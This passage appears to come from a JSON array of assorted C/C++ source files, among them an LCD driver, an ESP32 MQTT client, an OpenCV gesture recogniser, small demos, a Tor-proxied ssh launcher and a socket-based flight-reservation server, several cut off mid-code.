\"CONNECTS_TO\", edge1Props);\n    EdgeId edge2 =\n        GraphOps::addEdge(graph, node2, node3, \"LEADS_TO\", edge2Props);\n    EdgeId edge3 =\n        GraphOps::addEdge(graph, node3, node1, \"RETURNS_TO\", edge3Props);\n\n    // Test edge retrieval\n    std::cout << \"\\nTesting edge retrieval...\\n\";\n    auto edge1Data = GraphOps::getEdge(graph, edge1);\n    if (edge1Data) {\n      std::cout << \"Found edge \" << edge1Data->id << \" with label \"\n                << edge1Data->label << \"\\n\";\n      std::cout << \"Edge properties:\\n\";\n      for (const auto &[key, value] : edge1Data->properties) {\n        std::cout << \"  \" << key << \": \";\n        std::visit([](const auto &v) { std::cout << v; }, value);\n        std::cout << '\\n';\n      }\n    }\n\n    // Test edge update\n    std::cout << \"\\nTesting edge property update...\\n\";\n    PropertyMap updatedEdgeProps = {{\"weight\", 4.0},\n                                    {\"type\", std::string(\"updated\")},\n                                    {\"priority\", 10},\n                                    {\"new_edge_property\", std::string(\"test\")}};\n\n    bool edgeUpdateResult =\n        GraphOps::updateEdge(graph, edge1, updatedEdgeProps);\n    std::cout << \"Edge update result: \"\n              << (edgeUpdateResult ? \"success\" : \"failure\") << \"\\n\";\n\n    // Test invalid edge operations\n    std::cout << \"\\nTesting invalid edge operations...\\n\";\n    bool invalidEdgeUpdate = GraphOps::updateEdge(graph, 999, edge1Props);\n    std::cout << \"Invalid edge update result: \"\n              << (invalidEdgeUpdate ? \"success\" : \"failure\") << \"\\n\";\n\n    // Print current graph state\n    std::cout << \"\\nCurrent graph state:\\n\";\n    GraphOps::printGraph(graph);\n\n    // Test edge deletion\n    std::cout << \"\\nTesting edge deletion...\\n\";\n    bool edgeDeleteResult = GraphOps::deleteEdge(graph, edge1);\n    std::cout << \"Edge deletion result: \"\n              << (edgeDeleteResult ? \"success\" : \"failure\") << \"\\n\";\n\n    // Test invalid edge deletion\n    bool invalidEdgeDelete = GraphOps::deleteEdge(graph, 99",
    "#include \"lcdDriver.h\"\n\n// LCD is initially set to 8-bit mode. Reset the LCD controller to 4-bit mode before doing anything else //\nvoid LCD_init()\n{\n    // wait for power up - (longer than 30ms) //\n    _delay_ms(100);\n\n    // Reset the controller to enable 4-bit mode //\n    LCD_E_RS_init();    // Set E and RS pins active low for each LCD reset //\n\n    // Reset and wait for activation //\n    LCD_write_4bits(LCD_Reset);\n    _delay_ms(10);\n\n    // Set LCD to 4-bit Mode //\n    LCD_write_4bits(LCD_4bit_Enable);\n    _delay_us(80);  // delay must be > 39us //\n\n    //////////////  System Reset Complete   //////////////\n    /*\n    *   Now operating in 4-bit mode.\n    *   Must send high-nibble and low-nibble seperatly.\n    *   Can now set line numbers and font size.\n    *   Note: We use LCD_write_4bits() when in 8 bit mode\n    *   and the LCD_write_instruction() [calls LCD_write_4bits twice]\n    *   once we are in 4-bit mode.\n    *   The set of instructions are found in table 7 of the datasheet for the KS0066U -> https://www.lcd-module.de/eng/pdf/zubehoer/ks0066.pdf\n    */\n    LCD_write_instruction(LCD_4bit_Mode);\n    _delay_us(80);  // delay must be > 39us //\n\n    LCD_write_instruction(LCD_4bit_DisplayOFF);\n    _delay_us(80); //delay must be > 39us\n\n    LCD_write_instruction(LCD_4bit_DisplayCLEAR);\n    _delay_ms(80);  // delay must be > 1.53ms //\n\n    LCD_write_instruction(LCD_4bit_entryMODE);\n    _delay_us(80);  // delay must be > 39us //\n\n    // LCD should now be initialized to operate in 4-bit mode, 2 lines, 5x8 fontsize //\n    // Need to turn display back on for use //\n    LCD_write_instruction(LCD_4bit_DisplayON_BL);\n    _delay_us(80);  // delay must be > 39us //\n}\n\n\n\nvoid LCD_E_RS_init()\n{\n    // Set E and RS pins active low for the reset function //\n    PORTB &= ~(1<<LCD_EnablePin);\n    PORTB &= ~(1<<LCD_RegisterSelectPin);\n}\n\n\n\nvoid LCD_write_4bits(uint8_t Data)\n{\n    PORTA &= 0b00001111;    // clear upper nibble of PORTA //\n    PORTA |= Data;          // Write data to data lines on PORTA //\n\n    LCD_EnablePulse();      // Pulse the enable to write/read the data //\n}\n\n\n\n// Write instruction in 4-bit mode: send upper nybble then lower nybble //\nvoid LCD_write_instruction(uint8_t Instruction)\n{\n    // ensure RS is low //\n    LCD_E_RS_init();\n\n    LCD_write_4bits(Instruction);       // write high nybble\n    LCD_write_4bits(Instruction<<4);    // write low nybble\n}\n\n\n\n// Pulse read/write enable pin on the LCD Controller -  should be at least 230ns pulse width //\nvoid LCD_EnablePulse(void)\n{\n    // set enable bit low(currently) -> high -> low //\n    PORTB |= (1<<LCD_EnablePin);    // SET ENABLE HIGH //\n    _delay_us(1);                   // WAIT TO ENSURE PIN HIGH //\n    PORTB &= ~(1<<LCD_EnablePin);   //  SET ENABLE LOW //\n     _delay_us(1);                   // WAIT TO ENSURE PIN LOW //\n}\n\n\n\n// write character to display //\nvoid LCD_write_char(char Data)\n{\n    // Set up E and RS lines for data writing //\n    PORTB |= (1<<LCD_RegisterSelectPin);    // Ensure RS pin is high //\n    PORTB &= ~(1<<LCD_EnablePin);           // Ensure the enable pin is low //\n    LCD_write_4bits(Data);                  // write the upper nybble //\n    LCD_write_4bits(Data<<4);               // write lower nybble\n    _delay_us(80);                          // need to wait > 43us //       \n}\n\n\n// write an entire line of characters to the display //\nvoid LCD_write_line(char *Data)\n{\n    int i = 0;\n\n    // Set up E and RS lines for data writing //\n    PORTB |= (1<<LCD_RegisterSelectPin);    // Ensure RS pin is high //\n    PORTB &= ~(1<<LCD_EnablePin);           // Ensure the enable pin is low //\n\n    // Print all 8 characters to LCD //\n    while(Data[i]!='\\0')\n    {\n        LCD_write_4bits(Data[i]);       // write the upper nybble //\n        LCD_write_4bits(Data[i]<<4);    // write lower nybble\n        _delay_us(80);                  // need to wait > 43us //\n        \n        i++;\n    } \n}\n\n\n\n// Clear both lines of the display //\nvoid LCD_Clear()\n{\n    LCD_E_RS_init();\n    LCD_write_instruction(LCD_4bit_DisplayCLEAR);\n    _delay_ms(10);\n    //LCD_init();\n}\n\n\n// shift displayed data without changing DDRAM //\nvoid LCD_Shift_Display_Right()\n{   \n    LCD_write_instruction(LCD_shiftRight);\n    _delay_us(80);\n}",
    "#include \"ESP32_MQTTClient.h\"\n\nESP32_MQTTClient::ESP32_MQTTClient()\n{\n\t_isConnected = false;\n\tsetKeepAlive(30);\n\tsetMaxPacketSize(1024);\n}\n\nESP32_MQTTClient::~ESP32_MQTTClient()\n{\n\tesp_mqtt_client_destroy(_mqttClient);\n\tif (_uriBuf != nullptr)\n\t\tfree(_uriBuf);\n}\n\nvoid ESP32_MQTTClient::onMqttBeforeConnect(ESP32_MQTTCallbacks::OnMqttBeforeConnectCallback callback) {\n\t_onMqttBeforeConnectCallback = callback;\n}\n\nvoid ESP32_MQTTClient::onMqttConnected(ESP32_MQTTCallbacks::OnMqttConnectedCallback callback) {\n\t_onMqttConnectedCallback = callback;\n}\n\nvoid ESP32_MQTTClient::onMqttDisconnected(ESP32_MQTTCallbacks::OnMqttDisconnectedCallback callback) {\n\t_onMqttDisconnectedCallback = callback;\n}\n\nvoid ESP32_MQTTClient::onMqttTopicSubscribed(ESP32_MQTTCallbacks::OnMqttTopicSubscribedCallback callback) {\n\t_onMqttTopicSubscribedCallback = callback;\n}\n\nvoid ESP32_MQTTClient::onMqttTopicUnsubscribed(ESP32_MQTTCallbacks::OnMqttTopicUnsubscribedCallback callback) {\n\t_onMqttTopicUnsubscribedCallback = callback;\n}\n\nvoid ESP32_MQTTClient::onMqttMessageReceived(ESP32_MQTTCallbacks::OnMqttMessageReceivedCallback callback) {\n\t_onMqttMessageReceivedCallback = callback;\n}\n\nvoid ESP32_MQTTClient::onMqttMessagePublishConfirmed(ESP32_MQTTCallbacks::OnMqttMessagePublishConfirmedCallback callback) {\n\t_onMqttMessagePublishConfirmedCallback = callback;\n}\n\nvoid ESP32_MQTTClient::onMqttMessageDeleted(ESP32_MQTTCallbacks::OnMqttMessageDeletedCallback callback) {\n\t_onMqttMessageDeletedCallback = callback;\n}\n\nvoid ESP32_MQTTClient::onMqttError(ESP32_MQTTCallbacks::OnMqttErrorCallback callback) {\n\t_onMqttErrorCallback = callback;\n}\n\nvoid ESP32_MQTTClient::onMqttCustomEvent(ESP32_MQTTCallbacks::OnMqttCustomEventCallback callback) {\n\t_onMqttCustomEventCallback = callback;\n}\n\nvoid ESP32_MQTTClient::setBrokerUri(const char* uri)\n{\n\tif (ESP32_MQTTCLIENT_LOGGING_ENABLED)\n\t\tlog_d(\"MQTT uri %s\\n\", uri);\n\t_mqttUri = uri;\n\t_mqttConfig.broker.address.uri = _mqttUri;\n};\n\nvoid ESP32_MQTTClient::setBrokerUrl(const char* url, const int port, const char* scheme)\n{\n\tif (_uriBuf != nullptr)\n\t\tfree(_uriBuf);\n\t_uriBuf = (char*)malloc(strlen(scheme) + strlen(url) + 10);\n\tsprintf(_uriBuf, \"%s://%s:%u\", scheme, url, port);\n\tsetBrokerUri(_uriBuf);\n};\n\nvoid ESP32_MQTTClient::setBrokerIp(const IPAddress ipAddress, const int port, const char* scheme)\n{\n\tif (_uriBuf != nullptr)\n\t\tfree(_uriBuf);\n\t_uriBuf = (char*)malloc(strlen(scheme) + 25);\n\tsprintf(_uriBuf, \"%s://%d.%d.%d.%d:%d\", scheme, ipAddress[0], ipAddress[1], ipAddress[2], ipAddress[3], port);\n\tsetBrokerUri(_uriBuf);\n};\n\nvoid ESP32_MQTTClient::setClientName(const char* name)\n{\n\t_mqttClientName = name;\n\t_mqttConfig.credentials.client_id = _mqttClientName;\n}\n\nvoid ESP32_MQTTClient::setCredentials(const char* username, const char* password)\n{\n\t_mqttUsername = username;\n\t_mqttConfig.credentials.username = username;\n\t_mqttConfig.credentials.authentication.password = password;\n};\n\nvoid ESP32_MQTTClient::setClientCert(const char* clientCert)\n{\n\t_mqttConfig.credentials.authentication.certificate = clientCert;\n}\n\nvoid ESP32_MQTTClient::setCaCert(const char* caCert)\n{\n\t_mqttConfig.broker.verification.certificate = caCert;\n}\n\nvoid ESP32_MQTTClient::setAuthKey(const char* clientKey)\n{\n\t_mqttConfig.credentials.authentication.key = clientKey;\n}\n\nvoid ESP32_MQTTClient::setTaskPriority(int priority)\n{\n\t_mqttConfig.task.priority = priority;\n}\n\nvoid ESP32_MQTTClient::setMaxInPacketSize(const int size)\n{\n\t_mqttMaxInPacketSize = size;\n\t_mqttConfig.buffer.size = _mqttMaxInPacketSize;\n}\n\nvoid ESP32_MQTTClient::setMaxOutPacketSize(const int size)\n{\n\t_mqttMaxOutPacketSize = size;\n\t_mqttConfig.buffer.out_size = _mqttMaxOutPacketSize;\n}\n\nvoid ESP32_MQTTClient::setMaxPacketSize(const int size)\n{\n\tsetMaxInPacketSize(size);\n\tsetMaxOutPacketSize(size);\n}\n\nvoid ESP32_MQTTClient::setKeepAlive(const int keepAliveSeconds)\n{\n\t_mqttKeepAliveSeconds = keepAliveSeconds;\n\t_mqttConfig.session.keepalive = keepAliveSeconds;\n}\n\nvoid ESP32_MQTTClient::setReconnectTimeout(int reconnectTimeoutMs) {\n\t_mqttConfig.network.reconnect_timeout_ms = reconnectTimeoutMs;\n}\n\nvoid ESP32_MQTTClient::setNetowrkOperationTimeout(int networkOperationTimeoutMs) {\n\t_mqttConfig.network.timeout_ms = networkOperationTimeoutMs;\n}\n\nvoid ESP32_MQTTClient::setLastWillMessage(const char* topic, const char* message, const int qos, const bool retain)\n{\n\t_mqttConfig.session.last_will.topic = topic;\n\t_mqttConfig.session.last_will.msg = message;\n\t_mqttConfig.session.last_will.qos = qos;\n\t_mqttConfig.session.last_will.retain = retain;\n\t_mqttConfig.session.last_will.msg_len = strlen(message);\n}\n\nvoid ESP32_MQTTClient::disableCleanSession()\n{\n\t_mqttConfig.session.disable_clean_session = true;\n}\n\nvoid ESP32_MQTTClient::disableAutoReconnect()\n{\n\t_mqttConfig.network.disable_auto_reconnect = true;\n}\n\n/// <summary>\n/// Publishes message to broker\n/// </summary>\n/// <returns>message_id of the publish message (for QoS 0 message_id will always be zero) on success. -1 on failure, -2 in case of full outb",
    "#include <opencv2/opencv.hpp>\n#include <iostream>\n\n// Funci\u00f3n para preprocesar la imagen, detectando la piel en la imagen\ncv::Mat preprocessImage(const cv::Mat& frame) {\n    cv::Mat hsv, mask;\n    cv::cvtColor(frame, hsv, cv::COLOR_BGR2HSV); // Convertir la imagen de BGR a HSV\n    cv::Scalar lower_skin(0, 20, 70); // Umbral inferior para detectar piel\n    cv::Scalar upper_skin(20, 255, 255); // Umbral superior para detectar piel\n    cv::inRange(hsv, lower_skin, upper_skin, mask); // Crear una m\u00e1scara donde se detecta la piel\n    cv::erode(mask, mask, cv::Mat(), cv::Point(-1, -1), 2); // Erosionar la m\u00e1scara para eliminar ruido\n    cv::dilate(mask, mask, cv::Mat(), cv::Point(-1, -1), 2); // Dilatar la m\u00e1scara para restaurar el tama\u00f1o original\n    cv::GaussianBlur(mask, mask, cv::Size(3, 3), 0); // Aplicar un desenfoque gaussiano para suavizar la imagen\n    return mask; // Devolver la m\u00e1scara procesada\n}\n\n// Funci\u00f3n para reconocer gestos de la mano bas\u00e1ndose en la m\u00e1scara procesada\nstd::string recognizeHandGesture(const cv::Mat& mask, cv::Mat& output) {\n    std::vector<std::vector<cv::Point>> contours;\n    cv::findContours(mask, contours, cv::RETR_TREE, cv::CHAIN_APPROX_SIMPLE); // Encontrar contornos en la m\u00e1scara\n\n    if (contours.empty()) { // Si no se encuentran contornos\n        return \"No se\u00f1a detectada\"; // Devolver mensaje de no detecci\u00f3n\n    }\n\n    std::vector<cv::Point> largest_contour = contours[0]; // Suponemos que el primer contorno es el mayor\n    for (size_t i = 1; i < contours.size(); i++) {\n        if (cv::contourArea(contours[i]) > cv::contourArea(largest_contour)) { // Comparar \u00e1reas de contornos\n            largest_contour = contours[i]; // Actualizar el contorno m\u00e1s grande\n        }\n    }\n\n    std::vector<int> hull; // Contendr\u00e1 los \u00edndices de los puntos que forman el convex hull\n    cv::convexHull(largest_contour, hull, true); // Calcular el convex hull del contorno m\u00e1s grande\n\n    std::vector<cv::Vec4i> defects; // Contendr\u00e1 los defectos de convexidad\n    cv::convexityDefects(largest_contour, hull, defects); // Calcular los defectos de convexidad\n\n    // Dibujar puntos y l\u00edneas\n    /*\n    for (size_t i = 0; i < hull.size(); i++) {\n        cv::circle(output, largest_contour[hull[i]], 5, cv::Scalar(0, 0, 255), -1); // Puntos rojos\n        if (i > 0) {\n            cv::line(output, largest_contour[hull[i - 1]], largest_contour[hull[i]], cv::Scalar(0, 255, 0), 2); // L\u00edneas verdes\n        }\n    }\n\n    if (!hull.empty()) {\n        cv::line(output, largest_contour[hull[hull.size() - 1]], largest_contour[hull[0]], cv::Scalar(0, 255, 0), 2); // Cerrar la mano\n    }\n    */\n\n    // Dibujar contorno de la mano\n    cv::drawContours(output, std::vector<std::vector<cv::Point>>{largest_contour}, -1, cv::Scalar(0, 255, 0), 2);\n\n    int num_defects = 0; // Contador para el n\u00famero de defectos de convexidad\n    std::vector<cv::Point> fingerTips; // Para almacenar las puntas de los dedos\n    for (const auto& defect : defects) {\n        float depth = defect[3] / 256.0; // Calcular la profundidad del defecto\n        if (depth > 20) { // Si la profundidad es mayor que un umbral\n            num_defects++; // Incrementar el contador de defectos\n            cv::Point start = largest_contour[defect[0]]; // Punto de inicio del defecto\n            cv::Point end = largest_contour[defect[1]]; // Punto final del defecto\n            cv::Point far = largest_contour[defect[2]]; // Punto m\u00e1s lejano del defecto\n\n            fingerTips.push_back(start); // Agregar punto de inicio a las puntas de los dedos\n            fingerTips.push_back(end); // Agregar punto final a las puntas de los dedos\n\n            // Dibujar las l\u00edneas verdes entre los puntos de inicio y fin del defecto\n            cv::line(output, start, far, cv::Scalar(0, 255, 0), 2); // L\u00ednea verde\n            cv::line(output, far, end, cv::Scalar(0, 255, 0), 2); // L\u00ednea verde\n\n            // Dibujar un punto rojo en la articulaci\u00f3n\n            cv::circle(output, far, 5, cv::Scalar(0, 0, 255), -1); // Punto rojo\n        }\n    }\n\n    // Basado en el n\u00famero de defectos de convexidad y posici\u00f3n de los dedos, decidir la se\u00f1a\n    if (num_defects == 0) {\n        return \"Mano cerrada\"; // Si no hay defectos, la mano est\u00e1 cerrada\n    }\n    else if (num_defects == 1) {\n        return \"Numero 1\"; // Si hay un defecto, es el n\u00famero 1\n    }\n    else if (num_defects == 2) {\n        // A\u00f1adiendo l\u00f3gica para detectar la se\u00f1a \"OK\"\n        if (fingerTips.size() == 4) { // Comprobar si hay cuatro puntas de dedos\n            cv::Point a = fingerTips[0];\n            cv::Point b = fingerTips[1];\n            cv::Point c = fingerTips[2];\n            cv::Point d = fingerTips[3];\n            double ab = cv::norm(a - b);\n            double cd = cv::norm(c - d);\n            if (ab > 20 && cd > 20) { // Si las distancias entre los puntos son significativas\n                return \"OK\"; // Es el gesto \"OK\"\n            }\n        }\n        return \"Numero 2\"; // Si no, es el n\u00famero 2\n    }\n    el",
    "#include <iostream>\n#include <array>\n\n\n// finite state machine\n// https://www.aleksandrhovhannisyan.com/blog/implementing-a-finite-state-machine-in-cpp/\n// https://en.cppreference.com/w/cpp/language/switch\n\n\nenum LightState {\n        Off = 0,\n        Low = 1,\n        Medium = 2,\n        High = 3,\n};\n\nstd::array<LightState, 4> states {\n    LightState::Off,\n    LightState::Low,\n    LightState::Medium,\n    LightState::High,\n};\n\nLightState state = states[0];\n\nvoid toggle() {\n    state = states[(state + 1) % states.size()];\n}\n\n\nint main() {\n\n    std::cout << state << \"\\n\";\n    toggle();\n    std::cout << state << \"\\n\";\n    toggle();\n    std::cout << state << \"\\n\";\n\n    switch (state) {\n        case 0:\n            std::cout << \"Off\\n\";\n            break;\n        case 1:\n            std::cout << \"Low\\n\";\n            break;\n        case 2:\n            std::cout << \"Medium\\n\";\n            break;\n        case 3:\n            std::cout << \"High\\n\";\n            break;\n        default:\n            std::cout << \"None\";\n    }\n\n    return 0;\n}\n\n\n",
    "// this is a MIDI controller that has 9 potentiometers, based on the ARDUINO PRO MICRO\n// it is meant to expand on the features of akai apc mini mk2\n\n#include <Arduino.h>\n#include <MIDIUSB.h>\n\nuint8_t analogPins[9] = {A0, A1, A2, A3, A6, A7, A8, A9, A10};\n\nuint8_t firstCC = 70;\n\nuint8_t potentiometerValues[9] = {0, 0, 0, 0, 0, 0, 0, 0, 0};\nuint8_t lastPotentiometerValues[9] = {0, 0, 0, 0, 0, 0, 0, 0, 0};\n\nvoid controlChange(byte channel, byte control, byte value)\n{\n    midiEventPacket_t event = {0x0B, static_cast<uint8_t>(0xB0 | channel), control, value};\n    MidiUSB.sendMIDI(event);\n}\n\nvoid setup() {\n    //Serial.begin(115200);\n}\n\nvoid loop()\n{\n    for (int i = 0; i < 9; i++)\n    {\n        potentiometerValues[i] = map(analogRead(analogPins[i]), 0, 1023, 0, 127);\n        if (potentiometerValues[i] != lastPotentiometerValues[i])\n        {\n            controlChange(0, firstCC + i, potentiometerValues[i]);\n            // Serial.print(\"CC: \");\n            // Serial.print(firstCC + i);\n            // Serial.print(\" Value: \");\n            // Serial.println(potentiometerValues[i]);\n            lastPotentiometerValues[i] = potentiometerValues[i];\n        }\n    }\n    MidiUSB.flush();\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_application_duitqu\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <raylib.h>\n#define RAYGUI_IMPLEMENTATION\n#ifdef __GNUC__\n#pragma GCC diagnostic push\n#pragma GCC diagnostic ignored \"-Wmissing-field-initializers\"\n#pragma GCC diagnostic ignored \"-Wunused-parameter\"\n#pragma GCC diagnostic ignored \"-Wenum-compare\"\n#endif\n#include <raygui.h>\n#ifdef __GNUC__\n#pragma GCC diagnostic pop\n#endif\n\nint main() {\n  InitWindow(400, 200, \"raygui - controls test suite\");\n  SetTargetFPS(60);\n\n  bool showMessageBox = false;\n\n  while (!WindowShouldClose()) {\n    // Draw\n    //----------------------------------------------------------------------------------\n    BeginDrawing();\n    ClearBackground(GetColor(GuiGetStyle(DEFAULT, BACKGROUND_COLOR)));\n\n    const auto buttonRect = Rectangle(24, 24, 120, 30);\n    if (GuiButton(buttonRect, \"#191#Show Message\"))\n      showMessageBox = true;\n\n    if (showMessageBox) {\n      const auto msgBoxRect = Rectangle(85, 70, 250, 100);\n      int result = GuiMessageBox(msgBoxRect, \"#191#Message Box\",\n                                 \"Hi! This is a message!\", \"Nice;Cool\");\n\n      if (result >= 0)\n        showMessageBox = false;\n    }\n\n    EndDrawing();\n  }\n\n  CloseWindow();\n  return 0;\n}\n",
    "#include <iostream>\n#include <windows.h>\n#include <vector>\n#include <thread>\n#include <fstream>\n\n#include \"classes/json.hpp\"\n\nusing json = nlohmann::json;\n\nstd::vector<std::thread> threads;\nbool intentionalShutdown = false;\nHMODULE const DLL = LoadLibraryExW(L\"data/whiteavocado64.dll\", nullptr, 0);\nstd::string dataFiles[2] = {\"data/tor-whiteavocado.exe\", \"data/config.json\"};\njson configData;\nstd::string title = \"whiteavocado onion ssh\";\n\n#include \"classes/dll_methods.hpp\"\n\nbool dependenciesExist() {\n    for (std::string& f : dataFiles) {\n        if (!access(f.c_str())) { return false; }\n    }\n    return true;\n}\n\nvoid cls() {\n    system(\"cls\");\n}\n\nvoid wait() {\n    system(\"set /p end=\");\n}\n\nvoid torInstance() {\n    std::string buff;//Buffer that contains the result of the quietShell instance.\n    quietShell((\"start \" + dataFiles[0]).c_str(), buff);//Instance\n    if (intentionalShutdown) { return; }\n    msgBox(title.c_str(), \"tor instance stopped or already running, ignoring.\", \"o\", \"w\", buff);\n}\n\nvoid startTor() {\n    threads.emplace_back([] { torInstance(); });\n}\n\nvoid killThreads() {\n    for (auto& t : threads) {\n        if (t.joinable()) {\n            t.join();\n        }\n    }\n}\n\nvoid stopTor() {\n    std::string buff;\n    intentionalShutdown = true;\n    quietShell(\"taskkill /IM tor-whiteavocado.exe /F\", buff);\n}\n\n\nvoid setConfig() {\n    std::ifstream f(dataFiles[1]);\n    configData = json::parse(f);\n    f.close();\n    std::string buff = \"\";\n    try {\n        buff = configData[\"torService\"][\"port\"];\n        buff = configData[\"torService\"][\"ip\"];\n        buff = configData[\"torService\"][\"socksVersion\"];\n        buff = configData[\"firstUse\"];\n        buff = \"\";\n    }\n    catch (std::exception) {\n        msgBox(title.c_str(), (dataFiles[1] + \" file is not a valid format or is missing required indexes.\").c_str(), \"o\", \"e\", buff);\n        exit(1);\n    }\n    if (configData[\"firstUse\"] == \"true\") {\n        configData[\"firstUse\"] = \"false\";\n        std::string jsonStr = configData.dump(4);\n        std::ofstream f(dataFiles[1]);\n        if (f.is_open()) {\n            f << jsonStr;\n            f.close();\n        }\n\n        msgBox(title.c_str(), \"Thanks for downloading the onion ssh tool from whiteavocado!\", \"o\", \"i\", buff);\n    }\n}\n\nint main() {\n    system((\"@echo off && title \" + title + \" && color a && cls\").c_str());\n    if (!dependenciesExist()) {\n        system(\"color 4\");\n        std::cout << \"depending file(s) do not exist or no access. Aborted.\\n\\nPress enter to exit\\n\";\n        wait();\n        return 3;\n    }\n    setConfig();\n    startTor();\n    std::string connStr = \"\";\n    std::cout << title << \"\\n\\n>ssh \";\n    std::getline(std::cin, connStr);\n    system((\"plink.exe -ssh -proxycmd \\\"ncat.exe --proxy \" + std::string(configData[\"torService\"][\"ip\"]) + \":\" + std::string(configData[\"torService\"][\"port\"]) + \" --proxy-type socks\" + std::string(configData[\"torService\"][\"socksVersion\"]) + \" %host %port\\\" \" + connStr).c_str());\n    wait();\n    stopTor();\n    killThreads();\n    return 0;\n}\n",
    "#include \"interpreter/VM.hpp\"\n#include \"assembly/Code.hpp\"\n#include <format>\n#include <iostream>\n#include <memory>\n#include <sstream>\n#include <string>\n#include <unistd.h>\n\nusing ZenithVM::Assembly::Code;\nusing ZenithVM::Events::EventEmitter;\n\nnamespace ZenithVM::Interpreter {\n\n    void VM::run(unsigned int program) {\n        log(\"Starting VM\");\n        runCode(codes[program]);\n    }\n\n    void VM::runCode(Code code) {\n        programCounter = 0;\n        while (programCounter < code.size()) {\n            execute(code[programCounter]);\n        }\n    }\n\n    void VM::loadCode(Code code) { codes.push_back(code); }\n\n    void VM::execute(Operation operation) {\n        if (operation.instruction == Instruction::PUSH) {\n            push_multiple_bytes(currentFrame.stack, operation.operands);\n            programCounter++;\n        } else if (operation.instruction == Instruction::ADD) {\n            std::byte value;\n            for (auto byte : operation.operands) {\n                value = static_cast<std::byte>(static_cast<uint8_t>(value) + static_cast<uint8_t>(byte));\n            }\n            currentFrame.stack.push(value);\n            programCounter++;\n        } else if (operation.instruction == Instruction::WRITE) {\n            std::vector<u_int8_t> bytes;\n            while (!currentFrame.stack.empty()) {\n                bytes.push_back(static_cast<uint8_t>(currentFrame.stack.top()));\n                currentFrame.stack.pop();\n            }\n            log(std::string(bytes.begin(), bytes.end()));\n            programCounter++;\n        }\n    }\n\n    void VM::stop() { log(\"Stopping VM\"); }\n\n    VM::VM(std::unique_ptr<std::stringstream> &&logStream) {\n        this->logStream = std::move(logStream);\n        this->logEvents = std::make_unique<EventEmitter>();\n        this->currentFrame = Frame();\n    }\n\n    VM::~VM() {\n        // This is where the magic ends\n    }\n\n    void VM::log(std::string message) {\n        logStream->write(message.c_str(), message.size());\n        logEvents->emit(\"log\");\n    }\n\n    static void push_multiple_bytes(std::stack<std::byte> &stack, std::vector<std::byte> bytes) {\n        for (auto &byte : bytes) {\n            stack.push(byte);\n        }\n    }\n}\n",
    "#include <iostream>\r\n#include <cstring>\r\n#include <unistd.h>\r\n#include <arpa/inet.h>\r\n#include <sys/socket.h>\r\n#include <vector>\r\n\r\n#define PORT 8080\r\n#define MAX_CLIENTS 5\r\n\r\n// Sample flight data\r\nstruct Flight {\r\n    std::string flightNumber;\r\n    std::string destination;\r\n    float price;\r\n};\r\n\r\nclass FlightReservationServer {\r\npublic:\r\n    void start() {\r\n        int serverSocket, clientSocket;\r\n        struct sockaddr_in serverAddr, clientAddr;\r\n        socklen_t addrSize;\r\n\r\n        // Sample flight data\r\n        std::vector<Flight> flights = {\r\n            {\"FL100\", \"New York\", 250.50},\r\n            {\"FL101\", \"Los Angeles\", 300.75},\r\n            {\"FL102\", \"Chicago\", 180.00}\r\n        };\r\n\r\n        // Creating socket\r\n        serverSocket = socket(AF_INET, SOCK_STREAM, 0);\r\n        if (serverSocket < 0) {\r\n            std::cerr << \"Socket creation failed!\" << std::endl;\r\n            return;\r\n        }\r\n\r\n        serverAddr.sin_family = AF_INET;\r\n        serverAddr.sin_port = htons(PORT);\r\n        serverAddr.sin_addr.s_addr = INADDR_ANY;\r\n\r\n        // Binding socket\r\n        if (bind(serverSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {\r\n            std::cerr << \"Binding failed!\" << std::endl;\r\n            return;\r\n        }\r\n\r\n        // Listening for incoming connections\r\n        if (listen(serverSocket, MAX_CLIENTS) == 0) {\r\n            std::cout << \"Server listening on port \" << PORT << std::endl;\r\n        } else {\r\n            std::cerr << \"Listening failed!\" << std::endl;\r\n            return;\r\n        }\r\n\r\n        addrSize = sizeof(clientAddr);\r\n        while (true) {\r\n            // Accept client connection\r\n            clientSocket = accept(serverSocket, (struct sockaddr*)&clientAddr, &addrSize);\r\n            if (clientSocket < 0) {\r\n                std::cerr << \"Connection failed!\" << std::endl;\r\n                continue;\r\n            }\r\n\r\n            std::cout << \"Client connected!\" << std::endl;\r\n\r\n            // Receive flight reservation request\r\n            char buffer[1024] = {0};\r\n            read(clientSocket, buffer, sizeof(buffer));\r\n\r\n            // Handle flight reservation request\r\n            if (strcmp(buffer, \"view_flights\") == 0) {\r\n                // Send flight details to client\r\n                std::string flightDetails = \"Available Flights:\\n\";\r\n                for (const auto& flight : flights) {\r\n                    flightDetails += \"Flight Number: \" + flight.flightNumber +\r\n                                     \", Destination: \" + flight.destination +\r\n                                     \", Price: $\" + std::to_string(flight.price) + \"\\n\";\r\n                }\r\n\r\n                send(clientSocket, flightDetails.c_str(), flightDetails.length(), 0);\r\n            } else {\r\n                std::string response = \"Invalid request.\";\r\n                send(clientSocket, response.c_str(), response.length(), 0);\r\n            }\r\n\r\n            close(clientSocket);\r\n            std::cout << \"Client disconnected!\" << std::endl;\r\n        }\r\n\r\n        close(serverSocket);\r\n    }\r\n};\r\n\r\nint main() {\r\n    FlightReservationServer server;\r\n    server.start();\r\n    return 0;\r\n}\r\n",
